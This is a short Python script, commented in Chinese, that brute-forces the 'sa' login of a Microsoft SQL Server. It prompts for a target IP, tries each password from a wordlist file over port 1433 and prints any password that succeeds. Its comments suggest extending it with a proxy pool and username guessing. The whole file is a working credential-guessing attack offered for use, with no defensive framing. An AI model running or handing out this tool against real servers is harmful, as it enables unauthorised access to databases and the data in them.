import pymssql,os,time

# 可自定义密码文档
# 可在此基础上进行二次开发，列如引入代理池，增加用户名爆破等

def sqlserver_check(ip,password):
    try:
        print('check->' + ip + '|' + 'sa' + '|' + password)
        ct=pymssql.connect(server=ip,port=1433,user='sa',password=password)
        print("ip: %s sqlserver爆破成功 账号: sa  密码: %s" % (ip, password))
        exit()
    except Exception as e:
        pass

if __name__ == '__main__':
    path=os.getcwd()
    ip=input('请输入需要爆破sqlserver的ip: ')
    for password in open(path+'/sqlserver_pass.txt'):
        password=password.replace('\n','')
        sqlserver_check(ip,password)
